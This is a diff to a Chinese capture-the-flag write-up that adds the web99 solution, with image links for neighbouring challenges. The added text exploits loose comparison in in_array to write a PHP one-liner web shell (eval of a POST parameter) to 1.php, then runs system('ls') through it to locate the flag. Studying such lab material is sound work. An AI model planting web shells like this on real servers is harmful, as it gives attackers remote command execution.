@@ -77,5 +77,14 @@ pos是截取当前字符串第一个
 于是只用完成最后一个highlight_file三元运算就行了   
 ![98](/assets/images/9801.png)   
 
->**web98**  
-![99](/assets/images/9900.png)  
+>**web99**  
+![99](/assets/images/9900.png) 
+rand会生成随机数  
+in——array是延用了==弱类型比较  
+所以payload：
+get:n=1.php  POST: content=<?php eval($_POST[a]); ?> 
+在打开1.php  POST:a=system('ls')    
+发现了flag36d.php  在打开即可得到flag   
+
+>**web100** 
+![100](/assets/images/10000.png)   
